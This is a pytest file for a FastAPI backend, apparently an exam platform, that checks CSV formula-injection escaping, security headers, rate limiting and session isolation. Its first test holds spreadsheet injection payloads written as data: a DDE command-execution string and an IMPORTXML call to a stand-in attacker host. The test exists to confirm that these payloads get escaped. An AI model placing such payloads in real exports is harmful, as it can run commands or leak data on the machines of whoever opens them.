import uuid
import pytest
from unittest.mock import MagicMock
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.services.analytics_service import AnalyticsService
from backend.app.core.rate_limit import InMemoryRateLimiter


def test_csv_formula_injection_sanitization():
    """Verify that potentially malicious spreadsheet formula prefixes are safely escaped."""
    # Test formula characters =, +, -, @
    assert AnalyticsService._sanitize_csv_cell("=SUM(A1:A10)") == "'=SUM(A1:A10)"
    assert AnalyticsService._sanitize_csv_cell("+cmd|'/c calc'!A0") == "'+cmd|'/c calc'!A0"
    assert AnalyticsService._sanitize_csv_cell("-5+10") == "'-5+10"
    assert AnalyticsService._sanitize_csv_cell("@IMPORTXML('http://evil.com')") == "'@IMPORTXML('http://evil.com')"
    assert AnalyticsService._sanitize_csv_cell("  =1+1") == "'  =1+1"

    # Test harmless benign inputs
    assert AnalyticsService._sanitize_csv_cell("John Doe") == "John Doe"
    assert AnalyticsService._sanitize_csv_cell("Roll-12345") == "Roll-12345"
    assert AnalyticsService._sanitize_csv_cell(100) == 100
    assert AnalyticsService._sanitize_csv_cell(95.5) == 95.5
    assert AnalyticsService._sanitize_csv_cell(None) == ""


def test_security_headers_present_on_api_responses():
    """Verify that essential security headers are returned on all API responses."""
    client = TestClient(app)
    response = client.get("/health")
    assert response.status_code == 200

    headers = response.headers
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "SAMEORIGIN"
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
    assert "camera=()" in headers.get("Permissions-Policy", "")


def test_liveness_vs_readiness_health_endpoints():
    """Verify liveness endpoint does not depend on database while readiness verifies DB connectivity."""
    client = TestClient(app)

    # Liveness check (/health and /api/v1/health)
    resp_live = client.get("/health")
    assert resp_live.status_code == 200
    data_live = resp_live.json()
    assert data_live["status"] == "ok"
    assert data_live["database"] in ("healthy", "not_checked")

    resp_api_live = client.get("/api/v1/health")
    assert resp_api_live.status_code == 200
    assert resp_api_live.json()["status"] == "ok"

    # Readiness check (/health/ready and /api/v1/health/ready)
    resp_ready = client.get("/health/ready")
    assert resp_ready.status_code == 200
    data_ready = resp_ready.json()
    assert data_ready["status"] == "ok"
    assert data_ready["database"] == "healthy"


def test_rate_limiter_logic():
    """Verify rate limiter sliding window triggers 429 when threshold exceeded."""
    limiter = InMemoryRateLimiter(requests_per_minute=3, key_prefix="test_limit")
    ip = "192.168.1.100"

    assert limiter.is_allowed(ip) is True  # 1st
    assert limiter.is_allowed(ip) is True  # 2nd
    assert limiter.is_allowed(ip) is True  # 3rd
    assert limiter.is_allowed(ip) is False  # 4th (exceeds limit of 3)

    # Different IP is not blocked
    other_ip = "192.168.1.101"
    assert limiter.is_allowed(other_ip) is True

    # After reset, it is allowed again
    limiter.reset()
    assert limiter.is_allowed(ip) is True


def test_attempt_session_isolation_and_security(db_session, test_admin):
    """Verify candidate attempt cannot be modified or accessed by unauthorized sessions."""
    from backend.app.models.test_attempt import TestAttempt
    from backend.app.models.test import Test
    from backend.app.models.subject import Subject
    from backend.app.services.attempt_service import AttemptService
    from fastapi import HTTPException

    # Create subject and test
    subject = Subject(name=f"Subj-{uuid.uuid4().hex[:6]}", code=f"S-{uuid.uuid4().hex[:4]}")
    db_session.add(subject)
    db_session.flush()

    test_obj = Test(
        title="Security Test",
        code=f"SEC-{uuid.uuid4().hex[:6]}",
        subject_id=subject.id,
        created_by=test_admin.id,
        status="LIVE",
        duration_minutes=30,
        positive_marks=4.0,
        negative_marks=1.0,
    )
    db_session.add(test_obj)
    db_session.flush()

    # Create a test attempt belonging to candidate A
    attempt = TestAttempt(
        test_id=test_obj.id,
        student_name="Candidate A",
        roll_number="ROLL-001",
        session_id="secure_session_secret_A",
        status="IN_PROGRESS",
    )
    db_session.add(attempt)
    db_session.commit()
    db_session.refresh(attempt)

    # Valid session accesses state
    state = AttemptService.get_attempt_state(db_session, attempt.id, session_id="secure_session_secret_A")
    assert state.attempt_id == attempt.id

    # Invalid session is rejected with 403 Forbidden
    with pytest.raises(HTTPException) as exc_info:
        AttemptService.get_attempt_state(db_session, attempt.id, session_id="fraudulent_session_B")
    assert exc_info.value.status_code == 403

    # Attempt with wrong session is rejected
    with pytest.raises(HTTPException) as exc_info:
        AttemptService.get_attempt_state(db_session, attempt.id, session_id="wrong_id")
    assert exc_info.value.status_code == 403


def test_unhandled_server_exception_masks_internal_details():
    """Verify global exception handler catches errors and returns safe 500 without leaking stack traces."""
    client = TestClient(app, raise_server_exceptions=False)

    # Trigger a 404 or bad endpoint vs route that triggers internal error
    response = client.get("/api/v1/nonexistent-route-for-testing")
    assert response.status_code == 404

    # Verify response body format is safe
    data = response.json()
    assert "detail" in data
    # Ensure no Python traceback strings leaked
    assert "Traceback (most recent call last)" not in response.text
    assert "psycopg" not in response.text
    assert "SELECT" not in response.text
